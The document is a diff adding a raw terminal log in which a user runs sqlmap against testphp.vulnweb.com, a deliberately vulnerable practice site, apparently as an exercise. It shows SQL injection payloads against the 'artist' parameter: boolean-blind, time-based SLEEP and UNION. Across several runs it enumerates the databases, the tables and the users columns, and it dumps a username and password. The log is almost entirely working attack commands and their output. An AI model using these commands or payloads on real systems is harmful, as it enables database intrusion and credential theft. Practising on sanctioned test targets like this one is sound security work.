@@ -1,0 +1,353 @@
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -dbs
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.7#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:02:24 /2020-11-23/
+
+[10:02:24] [INFO] resuming back-end DBMS 'mysql' 
+[10:02:24] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1749=1749
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 1879 FROM (SELECT(SLEEP(5)))riEr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2159 UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6e61616b4a77627561786e6b69784d5275515a4c4149686b6446434e6c584d4a6b6c74704843564b,0x716a627071),NULL-- -
+---
+[10:02:25] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[10:02:25] [INFO] fetching database names
+[10:02:30] [WARNING] the SQL query provided does not return any output
+[10:02:30] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[10:02:30] [INFO] fetching number of databases
+[10:02:30] [INFO] resumed: 2
+[10:02:30] [INFO] resumed: information_schema
+[10:02:30] [INFO] resumed: acuart
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[10:02:30] [INFO] fetched data logged to text files under '/nike/.local/share/sqlmap/output/testphp.vulnweb.com'                                      
+
+[*] ending @ 10:02:30 /2020-11-23/
+
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
+        ___
+       __H__                                                               
+ ___ ___[(]_____ ___ ___  {1.4.7#stable}                                   
+|_ -| . [,]     | .'| . |                                                  
+|___|_  [']_|_|_|__,|  _|                                                  
+      |_|V...       |_|   http://sqlmap.org                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:03:56 /2020-11-23/
+
+[10:03:56] [INFO] resuming back-end DBMS 'mysql' 
+[10:03:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1749=1749
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 1879 FROM (SELECT(SLEEP(5)))riEr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2159 UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6e61616b4a77627561786e6b69784d5275515a4c4149686b6446434e6c584d4a6b6c74704843564b,0x716a627071),NULL-- -
+---
+[10:04:00] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[10:04:00] [INFO] fetching tables for database: 'acuart'
+[10:04:01] [WARNING] the SQL query provided does not return any output
+[10:04:01] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[10:04:02] [WARNING] the SQL query provided does not return any output
+[10:04:02] [INFO] fetching number of tables for database 'acuart'
+[10:04:02] [INFO] resumed: 8
+[10:04:02] [INFO] resumed: artists
+[10:04:02] [INFO] resumed: carts
+[10:04:02] [INFO] resumed: categ
+[10:04:02] [INFO] resumed: featured
+[10:04:02] [INFO] resumed: guestbook
+[10:04:02] [INFO] resumed: pictures
+[10:04:02] [INFO] resumed: products
+[10:04:02] [INFO] resumed: users
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+[10:04:02] [INFO] fetched data logged to text files under '/nike/.local/share/sqlmap/output/testphp.vulnweb.com'                                      
+
+[*] ending @ 10:04:02 /2020-11-23/
+
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --T users --columns
+        ___
+       __H__                                                               
+ ___ ___[']_____ ___ ___  {1.4.7#stable}                                   
+|_ -| . [(]     | .'| . |                                                  
+|___|_  [']_|_|_|__,|  _|                                                  
+      |_|V...       |_|   http://sqlmap.org                                
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --T
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns
+        ___
+       __H__                                                               
+ ___ ___["]_____ ___ ___  {1.4.7#stable}                                   
+|_ -| . [.]     | .'| . |                                                  
+|___|_  [)]_|_|_|__,|  _|                                                  
+      |_|V...       |_|   http://sqlmap.org                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:04:27 /2020-11-23/
+
+[10:04:28] [INFO] resuming back-end DBMS 'mysql' 
+[10:04:28] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1749=1749
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 1879 FROM (SELECT(SLEEP(5)))riEr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2159 UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6e61616b4a77627561786e6b69784d5275515a4c4149686b6446434e6c584d4a6b6c74704843564b,0x716a627071),NULL-- -
+---
+[10:04:29] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[10:04:29] [INFO] fetching columns for table 'users' in database 'acuart'
+[10:04:30] [WARNING] the SQL query provided does not return any output
+[10:04:30] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[10:04:30] [WARNING] unable to retrieve column names for table 'users' in database 'acuart'
+do you want to use common column existence check? [y/N/q] q
+[10:06:02] [ERROR] user quit
+
+[*] ending @ 10:06:02 /2020-11-23/
+
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns
+        ___
+       __H__                                                               
+ ___ ___[']_____ ___ ___  {1.4.7#stable}                                   
+|_ -| . ["]     | .'| . |                                                  
+|___|_  ["]_|_|_|__,|  _|                                                  
+      |_|V...       |_|   http://sqlmap.org                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:06:07 /2020-11-23/
+
+[10:06:07] [INFO] resuming back-end DBMS 'mysql' 
+[10:06:07] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1749=1749
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 1879 FROM (SELECT(SLEEP(5)))riEr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2159 UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6e61616b4a77627561786e6b69784d5275515a4c4149686b6446434e6c584d4a6b6c74704843564b,0x716a627071),NULL-- -
+---
+[10:06:09] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[10:06:09] [INFO] fetching columns for table 'users' in database 'acuart'
+[10:06:09] [WARNING] the SQL query provided does not return any output
+[10:06:09] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[10:06:09] [WARNING] unable to retrieve column names for table 'users' in database 'acuart'
+do you want to use common column existence check? [y/N/q] y
+which common columns (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
+[2] custom
+> 1
+[10:06:17] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'                                          
+[10:06:17] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] 1
+[10:06:22] [WARNING] running in a single-thread mode. This could take a while
+[10:06:24] [INFO] retrieved: name                                         
+[10:06:34] [INFO] retrieved: email                                        
+[10:07:37] [INFO] retrieved: address                                      
+[10:12:32] [INFO] retrieved: pass                                         
+[10:13:28] [INFO] retrieved: uname                                        
+[10:14:25] [INFO] retrieved: phone                                        
+[10:31:40] [INFO] retrieved: cart                                         
+                                                                          
+Database: acuart
+Table: users
+[7 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| name    | numeric |
+| address | numeric |
+| cart    | numeric |
+| email   | numeric |
+| pass    | numeric |
+| phone   | numeric |
+| uname   | numeric |
++---------+---------+
+
+[10:31:53] [INFO] fetched data logged to text files under '/nike/.local/share/sqlmap/output/testphp.vulnweb.com'                                      
+
+[*] ending @ 10:31:53 /2020-11-23/
+
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --C uname --dump
+        ___
+       __H__                                                                                                      
+ ___ ___[']_____ ___ ___  {1.4.7#stable}                                                                          
+|_ -| . [,]     | .'| . |                                                                                         
+|___|_  [,]_|_|_|__,|  _|                                                                                         
+      |_|V...       |_|   http://sqlmap.org                                                                       
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --C
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
+        ___
+       __H__                                                                                                      
+ ___ ___["]_____ ___ ___  {1.4.7#stable}                                                                          
+|_ -| . [)]     | .'| . |                                                                                         
+|___|_  [(]_|_|_|__,|  _|                                                                                         
+      |_|V...       |_|   http://sqlmap.org                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:03:07 /2020-11-23/
+
+[12:03:07] [INFO] resuming back-end DBMS 'mysql' 
+[12:03:07] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1749=1749
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 1879 FROM (SELECT(SLEEP(5)))riEr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2159 UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6e61616b4a77627561786e6b69784d5275515a4c4149686b6446434e6c584d4a6b6c74704843564b,0x716a627071),NULL-- -
+---
+[12:03:08] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:03:08] [INFO] fetching entries of column(s) 'uname' for table 'users' in database 'acuart'
+[12:03:08] [WARNING] the SQL query provided does not return any output
+[12:03:08] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[12:03:08] [INFO] fetching number of column(s) 'uname' entries for table 'users' in database 'acuart'                                                                                        
+[12:03:08] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[12:03:08] [INFO] retrieved: 1
+[12:03:11] [INFO] retrieved: test
+Database: acuart
+Table: users
+[1 entry]
++-------+
+| uname |
++-------+
+| test  |
++-------+
+
+[12:03:33] [INFO] table 'acuart.users' dumped to CSV file '/nike/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'                                                       
+[12:03:33] [INFO] fetched data logged to text files under '/nike/.local/share/sqlmap/output/testphp.vulnweb.com'                                                                             
+
+[*] ending @ 12:03:33 /2020-11-23/
+
+nike@kali:~$ sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump
+        ___
+       __H__                                                                                                      
+ ___ ___[,]_____ ___ ___  {1.4.7#stable}                                                                          
+|_ -| . [,]     | .'| . |                                                                                         
+|___|_  [(]_|_|_|__,|  _|                                                                                         
+      |_|V...       |_|   http://sqlmap.org                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:08:34 /2020-11-23/
+
+[12:08:34] [INFO] resuming back-end DBMS 'mysql' 
+[12:08:34] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1749=1749
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 1879 FROM (SELECT(SLEEP(5)))riEr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2159 UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6e61616b4a77627561786e6b69784d5275515a4c4149686b6446434e6c584d4a6b6c74704843564b,0x716a627071),NULL-- -
+---
+[12:08:35] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:08:35] [INFO] fetching entries of column(s) 'pass' for table 'users' in database 'acuart'
+[12:08:36] [WARNING] the SQL query provided does not return any output
+[12:08:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[12:08:36] [INFO] fetching number of column(s) 'pass' entries for table 'users' in database 'acuart'                                                                                         
+[12:08:36] [INFO] resumed: 1
+[12:08:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[12:08:36] [INFO] retrieved: test
+Database: acuart
+Table: users
+[1 entry]
++------+
+| pass |
++------+
+| test |
++------+
+
+[12:08:46] [INFO] table 'acuart.users' dumped to CSV file '/nike/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'                                                       
+[12:08:46] [INFO] fetched data logged to text files under '/nike/.local/share/sqlmap/output/testphp.vulnweb.com'                                                                             
+
+[*] ending @ 12:08:46 /2020-11-23/
+
+nike@kali:~$ 
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                   
